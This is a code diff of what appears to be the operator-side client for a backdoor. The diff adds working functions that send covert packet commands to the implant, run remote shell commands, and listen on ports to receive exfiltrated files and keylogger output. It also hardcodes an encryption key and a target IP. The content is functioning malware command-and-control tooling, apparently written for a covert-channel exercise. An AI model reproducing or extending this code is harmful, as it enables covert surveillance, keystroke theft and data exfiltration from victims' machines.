@@ -9,16 +9,15 @@ import socket
 from cryptography.fernet import Fernet
 import time
 
-host="localhost"
-#host="192.168.0.176"
+#host="localhost"
+host="192.168.0.12"
 port=8045
 TCP_EXFIL=8046
+TCP_KEY=8047
 key = b'EzBmzsJH6VogpmXpxI-bJS8xXgXMGgC2T_How8q24_w='
 pcap_filter="tcp[tcpflags] & (tcp-ack)==0 && (tcp dst port 8405 ||tcp dst port 8406)"
 Bflag="a"
 Eflag="a"
-#clientsocket=socket.socket(socket.AF_INET, socket.SOCK_STREAM) #create socket
-#clientsocket.connect((host,port)) #Run server first else you will receive connection refused error
 
 def options():
     print ("Please select one of the following options: \n 1. Exfilterate file \n 2. Run backdoor commands \n 3. receive keylogger file \n 4. kill backdoor \n 5. kill client without killing backdoor")
@@ -50,17 +49,14 @@ def exfil():
 	print("In Exfil")#debugging line
 	print("Connecting to exfil port...")
 	var="exfil"
-	#clientsocket.sendall(encryptmsg(var.strip()))
-	#time.sleep(5)
-	#exfilsocket=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	#exfilsocket.connect((host,TCP_EXFIL))
+
 	var = input("\nWhat directory do you want to monitor and exfilterate files from?: ")
 	if var!="":
 		sendpkt(var.strip(), 8405,9505)
 	print("Listening for files:")
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.bind((host, TCP_EXFIL))
-	s.listen(1)
+	s.bind(('', TCP_EXFIL))
+	s.listen(5)
 	while True:
 		sc, address = s.accept()
 		#print (address)
@@ -68,15 +64,17 @@ def exfil():
 		f = open('file_'+ str(i),'wb') #open in binary
 		i=i+1
 		while (True):       
-			# recibimos y escribimos en el fichero
 			l = sc.recv(1024)
-			while (l):
-				f.write(l)
-				l = sc.recv(1024)
+			print("Receving file")
+			print(l)
+			if not l : break
+			f.write(l)
+		
 		f.close()
 
 
 		sc.close()
+		break
 	s.close()
 	
 	options()
@@ -91,18 +89,42 @@ def bakdoor():
 	
 
 def keylog():
-    print("In Keylog")#debugging line
-    #clientsocket.sendall("keylogger".encode())
-    #receive keylogger file
-    
-    #d=sniff(filter='tcp src port 8046' prn
+	print("In Keylog")#debugging line
+
+	var="key"
+	sendpkt(var.strip(), 8405,9605)
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.bind(('', TCP_KEY))
+	s.listen(5)
+	while True:
+		sc, address = s.accept()
+		#print (address)
+		i=1
+		f = open('output.txt','wb') #open in binary
+		i=i+1
+		while (True):       
+			l = sc.recv(1024)
+			print("Receving file")
+			print(l)
+			if not l : break
+			f.write(l)
+		f.close()
+
+
+		sc.close()
+		break
+	s.close()
+	options()
 
 def kill_backdoor():
     print("Killing backdoor")#debugging line
-    
+    var="exit"
+    sendpkt(var,8405,9405)
+    sendpkt(var,8405,9405)
 
 def kill_client():
     print("Killing client")#debugging line
+    sys.exit()
 
 def sniffer():
 	s=sniff(filter=pcap_filter,prn=RecevePackets,stop_filter=stopfilter, count=1)
@@ -158,26 +180,19 @@ def ListenAuth(pkt):
 def send_receive():
 	print("You are connected, start!")#debugging line
 	BUFFER_SIZE=10000
-	#start listening for reponse from server
-	#If packet is from the server to the client, process it and print the output
-	#Runs after sending a command to server
+
 	while 1:
 		var = input("\n>>")
 		if var!="":
-			#clientsocket.sendall(encryptmsg(var.strip()))
-			sendpkt(var,8405,9405)
-			#clientsocket.sendall(var.strip().encode())
+
 			if var == "cd .." or var == "cd" : print("Can not change directories but you can run commands like 'cd ..&&pwd'")
 			elif var=="exfil":exfil()
+			elif var=="exit":break
 			else:
-				#data = decryptmsg(clientsocket.recv(BUFFER_SIZE).strip())
+
+				sendpkt(var,8405,9405)
 				sniffer()
-				#if data.decode()=="closing backdoor": #server has acknowledged receipt of exit command
-				#	clientsocket.close()
-				#	break
-				#sys.stdout.write(data.decode())
-				#sys.stdout.flush()
-				#print (data)
+
 		data =""
 	options()
 options()
